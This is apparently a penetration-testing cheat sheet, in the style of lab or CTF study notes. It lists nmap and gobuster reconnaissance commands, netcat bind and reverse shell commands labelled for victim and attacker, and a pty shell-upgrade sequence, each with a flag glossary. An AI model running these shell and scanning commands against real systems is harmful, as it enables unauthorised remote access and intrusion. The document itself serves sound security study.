# nmap (TCP)

## Host Discovery Scan

```
nmap -sn -oA pingsweep 127.0.0.1/24
```

## Initial Scan

```
nmap -sC -sV -oA initial 127.0.0.1
```

## All Port Scan

```
nmap -T4 -p- -oA allports 127.0.0.1
```

## Targeted Scan

```
nmap -p 21,22,80 -sC -sV -oA targeted 127.0.0.1
```

## Flag Glossary

`-sC` - Runs all available `nmap` scripts that are categorized as `default`

`-sV` - Probes open ports to determine service/version info

`-oA` - Saves nmap scan in all outputs (plaintext, greppable format, and xml)

​		`-oN` Can be used instead of `-oA` to save only plaintext

`-T#` - Run's scans at speeds 1-5, 1 being the slowest, 5 being the fastest

`-p` -  Specify specific ports, either comma separated or a range. `-p-` will specify all 65,535 ports



# gobuster

```
gobuster dir -u http://127.0.0.1:80/ -w /usr/share/wordlists/dirbuster/directory-2.3-medium.txt -x php
```

## Flag Glossary

`dir` - Specifies directory brute forcing

`-u` - Specifies the website to bruteforce

`-w` - Specifies file path to wordlist to use for bruteforcing

`-x` - Specifies file extensions to add to bruteforce attempts



# Netcat

## Bind shell

### Victim command:

```
nc -lvnp 4444 -e /bin/sh
```

### Attacker command:

```
nc 127.0.0.1 4444
```

### Reverse Shell

### Attacker Command:

```
nc -lvnp 4444
```

### Victim Command:

``` 
nc -e /bin/sh 127.0.0.1 4444
```

#### Look at pentest monkey for more reverse shell commands

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

## Flag Glossary

`-l`  - puts netcat in listen mode. Listens for inbound connections

`-v` - verbose mode, gives more information on incoming connections

​      `-vv` - very verbose mode, gives even more debug information

`-n` - Does not resolve dns, only allows for numeric IP addresses

`-p` - specifies port number

`-e` - program to execute after a connection is made



# Upgrading Shell

## Inside shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Hit Ctrl+Z to background your shell

### Run this command on your actual machine

```
stty -echo raw
```

### Bring your shell back by foregrounding it

```
fg
```

